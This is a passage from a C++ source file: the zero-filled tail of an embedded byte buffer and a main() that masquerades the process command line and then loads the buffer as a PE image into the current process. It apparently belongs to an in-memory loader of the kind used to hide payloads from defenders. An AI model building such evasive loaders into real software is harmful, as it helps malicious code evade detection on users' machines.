0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };

    // Example command line arguments
    const char* exampleCmdLineAnsi = "example.exe /exampleArg";
    MasqueradeCmdline(exampleCmdLineAnsi);

    try {
        LoadPE((HANDLE)-1, reinterpret_cast<char*>(pebuf.data()), pebuf.size());
    }
    catch (const PEException& e) {
        // Handle exceptions specifically from LoadPE
        std::cerr << "Error: " << e.what() << std::endl;
        // Perform any necessary cleanup or error reporting
    }
    catch (const std::exception& e) {
        // Handle any other exceptions thrown by standard library functions, etc.
        std::cerr << "Standard Exception: " << e.what() << std::endl;
    }
    catch (...) {
        // Catch any other types of exceptions not already handled
        std::cerr << "An unknown error occurred." << std::endl;
    }
    
    return 0;
}